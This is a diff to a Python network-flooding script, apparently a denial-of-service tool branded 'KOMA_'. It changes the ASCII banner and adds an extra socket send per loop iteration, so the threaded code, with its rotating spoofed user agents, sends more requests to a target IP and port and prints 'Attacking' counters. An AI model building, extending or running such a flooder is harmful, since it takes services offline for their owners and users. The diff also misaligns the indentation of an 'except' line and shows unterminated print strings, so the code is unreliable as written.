@@ -25,19 +25,18 @@ class bcolors:
     UNDERLINE = '\033[4m'
 
 # CLEAR
-print("
-print("     
-print("
-print("
-print("
-print("
-print("
-print("
-print("
+print("        🟤     🟤     🟤 🟤      🟤🟤    🟤🟤       🟤 🟤         ")
+print("        🟤    🟤    🟤     🟤    🟤 🟤  🟤 🟤    🟤      🟤       ")
+print("        🟤   🟤    🟤       🟤   🟤  🟤🟤  🟤   🟤        🟤      ")
+print("        ⚫ ⚫      ⚫       ⚫   ⚫   ⚫   ⚫   ⚫        ⚫      ")
+print("        ⚫ ⚫      ⚫       ⚫   ⚫   ⚫   ⚫   ⚫        ⚫      ")
+print("        🔵   🔵    🔵       🔵   🔵        🔵   🔵  🔵🔵🔵🔵      ")
+print("        🔵    🔵    🔵     🔵    🔵        🔵   🔵        🔵      ")
+print("        🔵     🔵     🔵 🔵      🔵        🔵   🔵        🔵      ")
 print("\033[33m================================================================\033[0m")
-print("\033[92m               use this script for good purpose                       \033[0m")
-print("\033[92m                        design by: Za'99                               \033[0m")
-print("\033[92m                           --oO0Oo--                                   \033[0m")
+print("\033[92m               use this script for good purpose                  \033[0m")
+print("\033[92m                        design by: Za'99                         \033[0m")
+print("\033[92m                           --oO0Oo--                            \033[0m")
 print("\033[33m================================================================\033[0m")                  
 
 useragents=["Mozilla/5.0 (Android; Linux armv7l; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 Fennec/10.0.1","Mozilla/5.0 (Android; Linux armv7l; rv:2.0.1) Gecko/20100101 Firefox/4.0.1 Fennec/2.0.1","Mozilla/5.0 (WindowsCE 6.0; rv:2.0.1) Gecko/20100101 Firefox/4.0.1",
@@ -105,12 +104,15 @@ def start():
             for i in range(packs):
                 s.send(str.encode(main_req))
                 xx += random.randint(0, int(packs))
-                print("\033[96m[+\033[96m]\033[33mKOMA_\033[92mAttacking {0}:{1}   \033[97mSent::.. {2}\033[0m".format(str(ip), int(port), xx))
+                print("\033[96m[+\033[96m]\033[33mKOMA_\033[92mAttacking {0}:{1}   \033[97mSent:.. {2}\033[0m".format(str(ip), int(port), xx))
                 s.send(str.encode(main_req))
                 xx += random.randint(0, int(packs))
-                print("\033[96m[+\033[96m]\033[33mKOMA_\033[92mAttacking {0}:{1}   \033[97mSent:::... {2}\033[0m".format(str(ip), int(port), xx))
+                print("\033[96m[+\033[96m]\033[33mKOMA_\033[92mAttacking {0}:{1}   \033[97mSent::... {2}\033[0m".format(str(ip), int(port), xx))
+                s.send(str.encode(main_req))
+                xx += random.randint(0, int(packs))
+                print("\033[96m[+\033[96m]\033[33mKOMA_\033[92mAttacking {0}:{1}   \033[97mSent:::.... {2}\033[0m".format(str(ip), int(port), xx))
         
-        except:
+         except:
                s.close()
                print("[+]Server Doen!.")
 for x in range(thread):
